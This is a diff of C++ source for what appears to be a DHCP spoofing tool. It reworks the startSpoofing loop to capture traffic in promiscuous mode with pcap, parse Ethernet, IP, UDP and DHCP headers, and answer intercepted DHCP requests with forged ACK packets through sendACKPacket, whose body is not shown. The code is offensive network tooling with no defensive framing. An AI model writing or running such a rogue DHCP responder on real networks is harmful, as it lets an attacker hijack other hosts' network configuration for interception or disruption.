@@ -20,7 +20,7 @@
 #pragma pack(1)
 #pragma comment(lib, "Ws2_32.lib")
 
-void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);
+void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP, Ethernet_header& pEther);
 
 int sendDiscoverPacket(AddressInfo& info)
 {
@@ -133,47 +133,19 @@ DWORD WINAPI startSpoofing(LPVOID info)
 	sockaddr_in sockinfo;
 	sockaddr_in dst;
 	int size = sizeof(dst);
-
-	int optval = 1;
-	int in;
-	int error;
-	bool sent = false;
+	pcap_pkthdr header;
 
 	DHCP_header pDHCP{};
 	UDP_header pUDP{};
 	IP_header pIP{};
+	Ethernet_header pEther{};
 
-	sockinfo.sin_addr.s_addr = inet_addr((const char*)(*(AddressInfo*)(info)).ipv4);
-	sockinfo.sin_family = AF_INET;
-	sockinfo.sin_port = htons(0);
-
-	//socket for recieving packets
-	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
-
-	if (s == SOCKET_ERROR)
-	{
-		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
-		WSACleanup();
-		return 1;
-	}
-
-
-	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));
-
-	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
-	{
-		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
-		WSACleanup();
-		return 1;
-	}
-	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);
-
-	char* raw_packet = new char[65536];
-	memset(raw_packet, 0, 65536);
+	u_char* raw_packet;
 	char* ack_packet = new char[65536];
 	
+	bool sent = false;
 	// socket for sending ack
-	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
+	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
 
 	if (!sock)
 	{
@@ -186,23 +158,18 @@ DWORD WINAPI startSpoofing(LPVOID info)
 	{
 		memset(ack_packet, 0, 65536);
 
-		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
+		raw_packet = (u_char*)pcap_next(sock, &header);
 
-		if (error == SOCKET_ERROR)
-		{
-			std::cout << " recv error: " << WSAGetLastError() << std::endl;
-			WSACleanup();
-			return 1;
-		}
+		if (!header.len)
+			break;
 
-		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
+		getDHCPPacketInfo((char*)raw_packet, pDHCP, pUDP, pIP, pEther);
 
 		if (checkForDHCP(pDHCP))
 				if (getDHCPtype(pDHCP) == 3)
 					sent = sendACKPacket(ack_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
 	}
 	delete[] ack_packet;
-	delete[] raw_packet;
-	closesocket(s);
+	pcap_close(sock);
 	return -1;
 }
